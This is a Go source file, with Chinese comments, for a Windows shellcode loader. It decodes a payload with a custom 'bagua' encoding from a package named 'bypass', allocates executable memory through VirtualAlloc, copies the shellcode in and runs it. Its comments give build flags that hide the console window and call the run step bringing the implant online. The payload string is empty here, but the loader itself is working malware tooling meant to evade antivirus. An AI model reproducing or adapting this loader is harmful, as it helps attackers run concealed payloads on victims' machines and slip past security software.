package main

import (
	bagua "bypass/bagua"
	// "fmt"
	"log"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func checkErr(err error) {
	//如果内存调用出现错误，可以报错
	if err != nil {
		//如果调用dll系统发出警告，但是程序运行成功，则不进行警报
		if err.Error() != "The operation completed successfully." {
			//报出具体错误
			println(err.Error())
			os.Exit(1)
			log.Fatal(err)
		}
	}
}

func runCode(code []byte) {
	// add
	VirtualAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
	RtlCopyMemory := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCopyMemory")

	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	checkErr(err)
	//syscall来运行shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	// reader := bufio.NewReader(os.Stdin) // 从标准输入生成读对象
	// fmt.Print("请输入shellcode：")
	// shellcode, _ := reader.ReadString('\n') // 读到换行
	// shellcode = strings.TrimSpace(shellcode)
	// fmt.Printf("%#v\n", shellcode)

	// 编码中的shellcode
	shellcode := ""
	// 解码
	shell := bagua.Bagua_de(string(shellcode))
	// fmt.Println(string(shell))
	// shell := string(decode)
	// fmt.Println(shell)
	// 编译命令
	// go build -trimpath -ldflags="-w -s -H=windowsgui"

	// 上线
	runCode(shell)
}
